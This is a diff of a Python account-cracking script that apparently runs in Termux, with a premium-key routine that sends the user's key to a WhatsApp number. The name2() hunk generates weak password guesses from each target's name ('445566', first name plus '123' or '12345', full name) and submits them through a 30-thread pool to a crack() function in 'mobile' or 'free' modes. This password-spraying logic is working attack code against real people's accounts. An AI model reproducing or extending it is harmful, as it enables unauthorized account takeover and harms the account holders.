@@ -55,15 +55,9 @@ try:
 	os.mkdir('/sdcard/')
 except:pass
 # COLORS
-x = '\33[m' 
-k = '\033[93m' 
-h = '\x1b[1;92m' 
-hh = '\033[32m' 
-u = '\033[95m' 
-K = '\033[95m' 
-kk = '\033[33m' 
-b = '\33[1;96m' 
-p = '\x1b[0;34m' 
+W = '\033[97;1m'
+R = '\033[91;1m'
+G = '\033[92;1m' 
 # Converter 
 dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'Agustus','9':'September','10':'October','11':'November','12':'December'}
 dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'Agustus','09':'September','10':'October','11':'November','12':'December'}
@@ -276,13 +270,21 @@ def name2():
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			frs = nmf.split(' ')[0],last=nmf.split(' ')[1]
-			pwv = [frs,last]
-			if len(nmf):
-				if len(frs +last):
+			frs = nmf.split(' ')[0]
+			pwv = ['445566']
+			if len(nmf)<6:
+				if len(frs)<3:
 					pass
 				else:
-					pwv.append(frs,last)
+					pwv.append(frs+'123')
+					pwv.append(frs+'12345')
+			else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(nmf)
+					pwv.append(frs+'123')
+					pwv.append(frs+'12345')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -1320,15 +1322,6 @@ class Main:
  
 		self.loop +=1
  
-#if len(sys.argv) == 2:
-#	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
-	#	helpnote()
-#	else:
-#		Main()
- 
-#try:Main()
-#except Exception as e:exit(str(e))
- 
 def Subscraption():
 	key1=open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
 	clear()
@@ -1361,5 +1354,13 @@ def Subscraption():
 		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
 		os.system('am start https://wa.me/+923185778830?text=' + tks)
 		Subscraption()        
-Main()
+
+if len(sys.argv) == 2:
+	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
+		helpnote()
+	else:
+		Main()
+ 
+try:Main()
+except Exception as e:exit(str(e))
 	
